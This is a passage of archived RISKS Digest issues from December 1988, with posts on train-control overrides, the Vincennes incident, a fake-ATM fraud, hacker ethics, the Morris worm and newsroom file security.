<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Fake ATMs 
</A>
<DD>
<A HREF="#subj3.1">
Rick Adams
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  `Trapdoor' -- War by Computer Virus 
</A>
<DD>
<A HREF="#subj4.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: "Hackers", "crackers", "snackers", and ethics 
</A>
<DD>
<A HREF="#subj5.1">
Douglas Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Hacking the etymology 
</A>
<DD>
<A HREF="#subj6.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: design intent of worm 
</A>
<DD>
<A HREF="#subj7.1">
Rich Thomson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  It's NOT a computer! 
</A>
<DD>
<A HREF="#subj8.1">
Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  There's no excuse 
</A>
<DD>
<A HREF="#subj9.1">
Aaron Harber via Martin Minow
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Overrides of train controls in Japan
</A>
</H3>
<address>
Jeff Schriebman
&lt;<A HREF="mailto:jeff@jusoft.jusoft.junet ">
jeff@jusoft.jusoft.junet 
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 09:04:24+0900
</i><PRE>
                            [@ucbvax.Berkeley.EDU,@unisoft:jeff@jusoft.UUCP]

Drivers Often Override ATS on Chuo-Sobu Line
Asahi Evening News, Thursday December 8, 1988

Tokyo, Japan -- Police investigating the Dec. 5 rear-end collision at
Higashi-Nakano Station on the East Japan Railway's Chuo Line, which killed
two [the driver and a passenger] and injured 102, have found that the train
drivers override the ATS (automatic train stop) system over 10 times during
the run between Chiba and Mitaka stations.

	This is because the heavy train schedules result in trains becoming
close-packed on the tracks. Police also found that the drivers in many cases
do not apply the hand brakes after overriding the ATS, as they are required
to do, because applying the brakes would delay the trains further.

	This practice of overriding the ATS and not applying the hand brakes
is believed to be in the background of the Dec. 5 rear-end collision.

	The investigations up to Wednesday showed that the brakes and ATS on
the train that ran into the stopped train were in good working order.

	JR East penalizes train drivers for being late more than 30 seconds
when calculating pay hikes and bonuses. Drivers say JR East is stricter on this
point than the old Japanese National Railways (JNR).  The catchword is, "Don't
be late!".

	The train that ran into the stopped train was about four minutes behind
schedule and JR people say that driver Teruki Hirano could have been trying to
make up for lost time.

	The union claims that the tight schedules produced the accident, but JR
East points out that similar schedules have been used for more than 20 years.
During the peak commuting hour in the morning, there are trains every two and a
half minutes, but at the time of the accident, the interval was one every three
and a half minutes.

	This was the third accident on the down line between Okubo and
Higashi-Nakano stations, and all three were rear-end collisions. They all
occurred between 9 and 10 a.m. after the morning rush hour. Most passengers get
off at Shinjuku Station, and drivers tend to relax because they have only a
little more to go to Nakano Station or Mitaka Station [the end of their run].

	No improvements were made in signal and safety facilities after the
second accident in 1980. Some experts point out that there should be more
signals installed at shorter intervals because of the sharp curve in front of
the station and the short distance between the end of the curve and the
station.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Vincennes and over-reliance on automation
</A>
</H3>
<address>
&lt;<A HREF="mailto:RILEY@csvax.src.honeywell.com">
RILEY@csvax.src.honeywell.com
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 15:16 CST
</i><PRE>

In RISKS 7.92, Randall Davis writes:

&gt; Can automation and reliance on remote sensing be overdone? Of course.
&gt; Is this an example of it, or an example of the opposite? [...] ...within
&gt; almost any reasonable definition, the system worked to supply accurate
&gt; and useful information in a form available in a "quick reference"; every
&gt; report that comes out continues to make that clear.

And earlier in the same submission, "When the report came out that the system
had supplied accurate information, the silence [among RISKS contributors] was
deafening."

As I understand the final Pentagon-issued report on the Vincennes incident,
the initial classification of the aircraft's identity and altitude vector
were indeed in error.  The October 15 Science News summarizes the findings
thus: "The computerized surveillance system on the Vincennes first misread
the plane's altitude and identified it as an F-14 fighter jet, but then
corrected itself.  The Navy report concludes crewmen responsible for
evaluating surveillance did not closely analyze the initial computer mistake.
Furthermore, the skipper paid more attention to their increasingly heated
reports of an emergency than to new displays generated by the computer."

That being the case, one could make a case for this being an example of
over-reliance on automation.  The crew involved believed the initial
system identification and altitude reading and did not double check
them, nor did they change their evaluation when given new, conflicting
information.  However, when faced with an over-the-horizon threat, the
crew has no choice but to rely on remote sensing and automated target
identification, so over-reliance is hardly an option.

I think this incident was primarily the result of an interaction
between automation and crew that system developers did not predict, and
in fact have no way of anticipating without extremely extensive scenario
generation and analysis.  The crew was "primed" to accept the initial
misidentification because a fire-fight with Iranian gunboats twenty
minutes prior to the aircraft encounter had raised their expectation of
attack and, in effect, lowered their target detection "threshold" to
the point where the original misidentification was easily accepted.

As automation becomes more complex, and as decision-making becomes more
automated, I think we'll see more of these types of incident.  System
developers need to realize that complex automation can produce subtle
and unintended consequences, due to the interactions between automation
and crew or between automated systems, and that these consequences can
lead to major errors.  I believe the major outcome of the Vincennes
incident should not be to assign blame to either automation or humans,
but rather to recognize that new analytic approaches should be developed
to uncover potential problems before such systems are fielded.

-Victor Riley, Honeywell Systems and Research Center
(all usual disclamers apply)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Fake ATMs 
</A>
</H3>
<address>
Rick Adams
&lt;<A HREF="mailto:rick@uunet.UU.NET ">
rick@uunet.UU.NET 
</A>&gt;
</address>
<i>
13 Dec 88 03:47:20 GMT
</i><PRE>
Organization: UUNET Communications Services, Arlington, VA

From Communications Week International, 21 Nov 88

One night last year, Italian banking clients using the ''bancomat,'' an
electronic teller, were pleased to discover that their bank branch had added an
extra terminal.  Delighted to be spared waiting time, the clients inserted
their cards into the machine. The bancomat presented the usual menu and
requested the client's personal identification numbers.  The machine, however,
withheld the client's cards, informing them that the cards were invalid and
that they should request information during banking hours.  It was only when
the clients returned to the bank the following day, ready to complain, that
they learned that they had been victims of a new kind of fraud. What had
appeared to be a bancomat was, in fact, a personal computer, placed on the bank
wall by an independent operator.  The thief/entrepeneur used the cards and
identification numbers to clean out their accounts.

This anecdote, revealed recently during a conference of banking security
experts, indicates the kind of problems faced by value-added services operators
in a country that has serious organizational difficulties.

    [This is the old system-spoof problem.  Authentication is a two-way street.
    The system needs some sort of authentication that the user identity is
    authentic.  But the user also needs some sort of authentication that the
    system identity is authentic.  PGN]
    
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
`Trapdoor' -- War by Computer Virus
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
12 Dec 88 17:51:52 PST (Monday)
</i><PRE>

In the 11 Dec 88 'Los Angeles Times Book Review' Times Book Editor Jack
Miles reviews a new novel, "Trapdoor" by Bernard J. O'Keefe (Houghton
Mifflin).  The headline for the review is WAR BY COMPUTER VIRUS.  It quotes
from the epilogue to the novel, in which the author calls it a "parable to
point out the complexity of modern technology and to demonstrate how one
error, one misjudgment, or one act of sabotage could lead to actions that
would annihilate civilization."

I have not read the book, but according to the review, an inside saboteur
plants a delayed-action "virus" (the review calls it one, although the
description doesn't really sound like one) in a Pentagon computer which
messes with the public-key encryption codes required to fire US missiles
equipped with permissive action links.  "The result:  America no longer
knows the code necessary to launch its own weapons.  The nation is
defenseless."  (In the epilogue, the author points out that it can't quite
happen that way.)  Much more transpires.

The author, O'Keefe, earlier wrote the non-fiction "Nuclear Hostages,"
worked with Fermi and Oppenheimer on the Manhattan Project, and heads EG&amp;G,
the company which the publisher says has "conducted all nuclear weapons
tests for the US government for the last 40 years and is the operating
contractor for the Kennedy Space Center."

The reviewer says, "there remains a lean and gripping parable hiding inside
an only slightly overweight thriller.  For all its novelistic faults, I
can't imagine a timelier read or a better Christmas gift for anyone serious
about computers or math.... If the computers that control our nuclear
weapons can be disabled, what about the computer that control our nuclear
power plants?  What about the computers that control our vote-counting and
our stock transactions?..."

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: "Hackers", "crackers", "snackers", and ethics
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones@herky.cs.uiowa.edu">
jones@herky.cs.uiowa.edu
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 09:05:08 CST
</i><PRE>

In Andy Goldstein's contribution of 12 Dec 88, he says, in reaction to
my previous comments:

&gt; Many of the computer systems involved are crucial to a business's
&gt; operation; some are critical to human life. The potential (and in some
&gt; cases the actuality) is there for major losses from disruption of
&gt; service and theft. The hackers are unknown outsiders in whom a serious
&gt; organization can place no trust whatsoever.

One of my examples was Com-Share Incorporated.  This description exactly fits
Com-Share.  Com-Share had only one buisness:  Selling timesharing services.
Com-Share had more customers than any other timesharing service in the early
'70s, and the customers were distributed nationwide.  Security was of the
utmost importance; without it, the company would surely have failed in the
marketplace.

In this context, the reward offered by Com-Share to anyone discovering
a loophole in the system security served an important role.  Goldstein
describes the hackers who threaten a commercial service as follows:

&gt; The hackers are unknown outsiders in whom a serious
&gt; organization can place no trust whatsoever.

Without the reward, the company would have clearly had to react to hackers as
the above quote indicates.  With the reward, the company could not exactly
trust hackers, but rather, the company could make it more rewarding for a
hacker to tell the company what was wrong than to take a less desirable path
such as selling improperly obtained information to a third party.  A reward
does not automatically make all hacking constructive, but it offers an
incentive for constructive hacking.  By the same token, legal dis-incentives
for destructive hacking also can help.

What I oppose are blindly applied blanket actions taken against all hackers.
These provide an incentive to stay away from hacking, but if someone insists on
hacking, they provide no incentive towards constructive behavior.  I feel that
hacking is a sufficiently attractive activity that some people will hack
whether it is legal or not, and we must keep incentives in the system to direct
the behavior of such people to constructive ends.
                              				Douglas W. Jones

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Hacking the etymology
</A>
</H3>
<address>
Nigel Roberts, D-8043 Unterfoehring
&lt;<A HREF="mailto:roberts%untadh.DEC@decwrl.dec.com ">
roberts%untadh.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 07:00:26 PST
</i><PRE>

The recent discussions of the etymology of the terms "hacker", "cracker", 
_et al_ &amp; the recent spirited defence of the activity by one or two 
contributors (at least one of them being a self-confessed "hacker") has 
set me to thinking.

In RISKS &amp; elsewhere, I see a "generation gap" between what, for want of a
better term, I would describe as the "old-time hackers", who were
experimenters, and the current cyberpunks, the "hackers" of popular mediaspeak,
the eponymous "shatterers".

I think this apparent generation gap is fundamental to the discussion. 

The "old-style hackers" (of whom I am vain enough to claim I belong) learned
their computing in the 60s and 70s, often in a university or similar multiuser
environment, where, as often as not, hacking involved programming.

Today's stainless steel rats are much more likely to have discovered computers
in the home, courtesy of Apple, Commodore or IBM, and started their "network
tourist" activities by purchasing a modem.

The old school (&amp; I include myself here) resents the way the term "hacker" 
has been hi-jacked and is today being used to connotate anti-social activity. 
This is despite the ambiguous roots of the term (described by Weizenbaum
in _Computer Power &amp; Human Reason_).

Today's cyberpunks are computer burglars, who are attempting to justify their
activities by claiming a common motivation with their arguably less anti-social
predecessors.

Like any story of generation conflict, there are elements of truth in the
claims of both sides.

It is going to be impossible to prevent the media from using the word "hacker"
in a way that the "old school" dislike. It would almost be easier to claim that
the word "gay" meant "happy, carefree".

But maybe the media and the collective unconscious understand the evolution 
of hackerism better than we do.

For just as there is at least a tiny thread of commonality with the hackers of
old in the network rats of the 80s, and I would say that there was some small
element of today's network rats in the hackers of old.

But of course, there IS a distinction between hacking around a system whose
sole reason of being is to teach people about computers, and hacking into
systems which are being used for serious business purposes and where outsiders
no right to be.

That difference is ethical, and has well expounded here in RISKS already.

Seeing as we can't get rid of "hackers" in the popular media, I would like 
to coin the term "punk hackers" (an abbreviation of 'cyberpunk hackers')
to describe their anti-social activities.

It seems to fit only too well, just like "punk rock" is rock music with 
swearing &amp; spitting at the audience. 

And using it would let us "old hackers" keep our self-respect!

	Nigel Roberts,  	Munich, W. Germany.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: design intent of worm
</A>
</H3>
<address>
Rich Thomson
&lt;<A HREF="mailto:thomson@wasatch.utah.edu ">
thomson@wasatch.utah.edu 
</A>&gt;
</address>
<i>
Mon, 12 Dec 88 22:17:59 MST
</i><PRE>
Organization: Oasis Technologies

In RISKS DIGEST 7.92 cjosta@taux01.UUCP (Jonathan Sweedler) writes
&gt;It seems that Robert Morris Jr. would not have done anything illegal
&gt;(even under these new bills) if his virus had worked as it was designed
&gt;to work: to propagate quietly from machine to machine.

Several times I've seen it discussed here on RISKS about what the worm
would have done had "it worked as it was designed to work".  One of our
local compiler gurus, Donn Seeley, was the person who decompiled the worm
code from which Gene Spafford wrote his paper.  Donn Seeley has also
written a paper on the worm and I attended a talk he gave on the worm
here at the University of Utah.

He was asked the question "On USENET there has been discussion to the
effect that the author intended the worm to propagate slowly from machine
to machine, but a programming error caused the worm to replicate out of
control.  What evidence did you see in the code to support this?"

His answer was "None."  This business about the worm "doing what it was
designed to do" is merely a rumor going around USENET and has no
substantiation in fact, unless RTM himself starts claiming that there was a
design mistake.  Since RTM has so far remained silent, I'm inclined to
believe Donn Seeley.

There is NO EVIDENCE in the decompiled code to indicate that the worm was
intended to propagate slowly.  In fact, the minimum lifetime the worm could
have is fifteen minutes.  There is code in the worm that deals with "population
control", but this is oriented more towards making sure that not too many
copies of the worm are running so that the worm can get some "work" done.
Otherwise, the worm would never propagate out of the first few machines because
it would be so busy re-infecting them.
                        			-- Rich

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
It's NOT a computer!
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com">
minow%thundr.DEC@decwrl.dec.com
</A>&gt;
</address>
<i>
13 Dec 88 14:17
</i><PRE>

Reading the recent risks discussion (and listening to conversation at parties)
was an education.  So much magic:
	cr--r-----  1 root     sys        3,   0 Jan 10  1987 /dev/mem
	chown root /dev/mem /dev/kmem ...
	chgrp sys /dev/mem /dev/kmem ...
	chmod 440 /dev/mem /dev/kmem ...
(From Paul McKenney's note in Risks 7.87)

Friends, this thing under my desk isn't a computer, and I'm not a computer
programmer.  Of course, it looks like a computer, and the woman who services
it probably assumes it's a computer, and the guy in the next office who
designed it is quite certain it's a computer, (and the folks who pay
my salary hope I'm a computer programmer), but they're all wrong.

It's a tool, that's all; and, when I'm reading my mail or writing my programs,
I'm every bit as naive as the folks who say "hello" when the login program
tells them to.  It's a smart typewriter, and that's all it should be.

I don't want to program my workstation.  I don't want to become a Unix guru
to get my work done, and I don't want to have to play hide-and-seek with every
snake to slither out of a C programming course.  I want to take the stuff out
of the box, plug it in, and get some work done without having to worry whether
/dev/mem is owned by root.

Telling me how to repair the problem is missing the point altogether.
In fact, there is so much software inside of that workstation and the
comptuter network it connects to: Ultrix, X-windows, Microemacs, Ethernet,
VMS, more Ethernet, disk servers, and whathaveyou, that I doubt that there
is any single person who can navigate through the entire collection.  I have
to trust the people who have "privileges" to do their job responsibly, and
the people who design the systems to limit my risk.

Now, where did I put my copy of Normal Accidents?

Martin Minow
minow%thundr.dec@decwrl.dec.com

The above does not represent the position of Digital Equipment Corporation.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
There's no excuse
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com">
minow%thundr.DEC@decwrl.dec.com
</A>&gt;
</address>
<i>
13 Dec 88 13:58
</i><PRE>

Excerpts from an op-ed piece in the business section of the Boston Globe,
Tuesday, Dec 13, 1988:

  For Robert T. Morris Jr., hacker, there's no excuse      
  By Aaron Harber

[Harber teaches at the Kennedy School of Government at Harvard University
and is a director of two software companies.]

... With hackers around the country proclaiming Morris a superstar, he is
on the path to becoming a folk hero.  We must see that his punishment is
swift and severe so that his actions are immediately seen and understood
as undesirable and unacceptable.  To do any less will sow the seeds for
further undertakings by those who are as "bright and bored" as Morris.

... Morris' good intentions failed in two respects.  First, once he realized
his error, he had many opportunites to correct it... He panicked and failed
to seriously attempt to correct his monster.

More importantly, Morris knew he should not have made the attempt at all.
It was not only that something might go wrong.  He had many other ways of
proving his theories and, ironically, was someone people would listen to had
he raised the concern in a legitimate forum.  In a supervised demonstration,
he could have made his point and received the attention and accolades he
may have sought.

His attempt was based on the premise accepted by far too many people: Computer
systems are different from other forms of property... It is considered by all
to be unethical and illegal to enter someone's business and examine records
without permission.... Yet hackers see invasion of a system as a challenge and
are often rewarded for their "successes."

... Students are taught skills that give them the power to do both positive
and negative deeds, yet they are rarely, if ever, schooled in the ethical
deployment of that power.  Given the constant demonstrations of a hacker's
potential power, why are computer ethics courses not mandatory? ...

Robert Tappan Morris Jr. is an example of how we have failed and his example
is one that will be followed until we change society.  Hackers will continue
to see breaking into systems and implanting viruses as a game.  They know
they would not physically ever harm someone, yet do not comprehend the
violence of their seemingly benign actions.  They rarely see, in person, the
results of their activities and this distance promotes their insensitivity.

... The possibilities [for harm] are endless.  Unless and until new standards
are set and accepted by the country, we will continue to suffer from people
such as Robert Tappan Morris Jr. and their computer viruses.

[Excerpted by Martin Minow minow%thundr.dec@decwrl.dec.com
The above does not represent the position of Digital Equipment Corporation.]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.92.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.94.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-46</DOCNO>
<DOCOLDNO>IA012-000131-B036-146</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.94.html 128.240.150.127 19970217024507 text/html 11053
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:43:36 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 94</TITLE>
<LINK REL="Prev" HREF="/Risks/7.93.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.95.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.93.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.95.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 94</H1>
<H2> Thursday 15 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Vincennes:  conclusively, a computer-related error 
</A>
<DD>
<A HREF="#subj1.1">
Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Ethics 
</A>
<DD>
<A HREF="#subj2.1">
Dennis G. Rears
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  "It's already in the computer" 
</A>
<DD>
<A HREF="#subj3.1">
David Sherman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  RISKS of Tightening Security 
</A>
<DD>
<A HREF="#subj4.1">
F.Baube
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Vincennes:  conclusively, a computer-related error
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Wed, 14 Dec 88 21:07:08 PST
</i><PRE>

&gt;  From: davis@wheaties.ai.mit.edu (Randall Davis)
&gt;  When [Vincennes] first happened we saw a remarkable flood of
&gt;  messages to Risks speculating about the role of advanced
&gt;  automation in general and computers in particular as central
&gt;  to this disaster....
&gt;  there is, with only a few exceptions, clearly a strong
&gt;  desire in the Risks community to believe otherwise.  Perhaps
&gt;  that's worth a few minutes reflection.

I reflect that *all* the information that panicked the Vincennes crew and
captain came from the computers.  The captain was not faulted for trusting his
AA officer, the AA officer was not faulted for misreading (or not reading) his
console, and the officers who reported to the AA officer were not found at
fault.  The fault was found to lie largely with the computer's initial
classification of the flight as hostile, and the computers' subsequent unclear
albeit correct presentation of the ascent data.  The actions taken to remedy
the deficiencies are improvements in the computer display/ human interface.
This is a a classic case of computer *related* error: unobvious and secondary
display of criticial data.

What the Pentagon has has more or less overtly ruled is that its
most competent, trained, and alert officers cannot be blamed for
mistakenly reading and acting on deadly computer displays,
especially not in combat, i.e. when they're actually used.
Replacing alphanumerics with an up/down arrow is the planned
solution to the Vincennes problem.  (Who will be accountable if
the arrow is misread, or if it points the wrong way owing to a
subtle bug - again the computerization?)   As the OTA reported with
respect to nuclear launch under attack (i.e. on warning):
"The risk of error for an LUA system would seem highest when the
human being's ability to make highly structured errors combines with
the machine's limited ability to correct [for] them."  (1981, MX
Missile Basing.)

I saw a front-page report of the approbatory celebration that greeted the
Vincennes Captain and crew on their return to port.  Garlanded and with a huge
grin on his face, having been exonorated by the official inquiry, Captain
Rogers stated he knew he'd done the right thing in the circumstances. I
chillingly wonder if the sister ship, that correctly identified the Iranian jet
as commercial, will receive as loud applause?

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Ethics
</A>
</H3>
<address>
    "Dennis G. Rears (FSAC)" 
&lt;<A HREF="mailto:drears@ARDEC.ARPA">
drears@ARDEC.ARPA
</A>&gt;
</address>
<i>
Wed, 14 Dec 88 12:37:49 EST
</i><PRE>

    Several articles in Risks and other USENET groups have commented on the
need for ethics course(s) for "computer people".  I feel there is a need for
them, however, I question the content.  It is my belief that what is and is not
"ethical behaviour" is not clearly defined.  There are some areas that are
agreed on as off limits, "destroying data" and some which are not "perusing
files".  In my mind I don't have a clear guide.  It's like the one Supreme
Court Justice who said "I can't define Pornography but I know it when I see
it".  I think that describes computer ethics right now.
    Also on a similiar theme, the system admins who were complaining about the
loss time involve in fighting the worm should have had their systems right in
the first place.  I view it as negligent to have programs like uucp &amp; sendmail
on systems unless the admin is aware of all the ramifications.  They didn't
deserve to have their systems broken into, but, they didn't really do their job
in the first place.  I must add this does *not* apply to victims of the worm.
    The risk I see is blind trust in computer jocks (wizards, gurus, experts,
etc).  The trust being mainly in technical compentence.  I have seem some
sysadmins who are nothing more then operators (some even less).  However at
many places non-computer people believe "oh, the problem so technical I won't
explain to you because you won't understand it".  As part of being a
professional we must spread our knowledge and give other a deeper understanding
on what know and do.
                    			Dennis Rears

--------------------------------------------------------------------------

Date: 13 Dec 88 10:01:21 EST (Tue)
From: dave%lsuc%attcan@uunet.uu.net (David Sherman)
Subject: "It's already in the computer"

The other day I parked in a multi-story parking lot while going to
the doctor.  "Parking rates: $1.00 per half-hour".  Well, it took
several minutes to get to a parking space on the 6th floor, and about
10 minutes to drive down to the cashier when I came out; this included
a good 7-8 minutes waiting in the line of cars to pay the (single) cashier.

My in-ticket was stamped 15:09.  I decided while waiting in the
line of cars to leave, around 16:08, that as a question of principle
I shouldn't pay for more than an hour, since I was parked for a fair
bit less than an hour.  I make it to the cashier (where they have a
"5 minutes grace" notice), and it's 16:15 when he punches in my ticket.
I hand him $2, and he insists I owe him another dollar.  I say no,
pointing out the amount of time I was waiting in the line to pay.

The RISKS interest lies in his response at this point.
Before computer control of parking cashiers, he could no doubt have
waved me off and accepted the $2.  Now, though, "it's already in the
computer", and if he doesn't get $3, he tells me, it'll come out of
his pocket.  I hung tight, on principle, and told him to take my number
and have his supervisor call me if he liked (he didn't like).  Since I
was blocking the only exit to the lot, cars were backing up behind and people
were getting annoyed, eventually he gave up and raised the gate.

So who controls how much you owe at a parking exit?  People don't
matter.  It's "the computer".

David Sherman, Toronto		attcan!lsuc!dave@uunet.uu.net

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
RISKS of Tightening Security
</A>
</H3>
<address>
"F.Baube" 
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Wed, 14 Dec 88 10:12:14 -0500
</i><PRE>

The _City Paper_ of Washington DC, December 9, reports that the _Washington
Times_ was stricken by a "computer catastrophe" last week.  No, not a mainframe
felled by a virus infection.

"The powers-that-be at the _Times_ disabled the computer system's powerful
"RODI" command.

The RODI command ("Read Only Direct") was much loved by _Times_ reporters and
editors because it permitted anyone with a computer logon to examine
practically any file - stories or notes - in the ... system.  Only files that
bad been secured with the system's "lock" command were safe from the eyes of
the RODI cognoscenti.  Because the lock command is so cumbersome, 99.9% of the
paper's files were left unguarded.

"Everyone thought it was their personal little secret," one computer
investigative ace says. "On Wednesday [Nov. 30] you could hear an audible wave
of despair washing over the newsroom ... One _Times_ reporter ... lamented
aloud: "How am I supposed to know what's going on around here without RODI ?"

Nosy _Times_ reporters aren't the only ones crushed by the loss of RODI.
_Times_ sports fans are despondent, too, because RODI allowed them to freely
scroll the sports wire for scores and news.

One _Times_ employee blames this column for RODI's termination, saying, "I'm
sure the editors got tired of seeing their memos printed in _City Paper_."

#include &lt;disclaimer.h&gt;

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.93.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.95.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-47</DOCNO>
<DOCOLDNO>IA012-000131-B036-165</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.95.html 128.240.150.127 19970217024543 text/html 21828
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:43:48 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 95</TITLE>
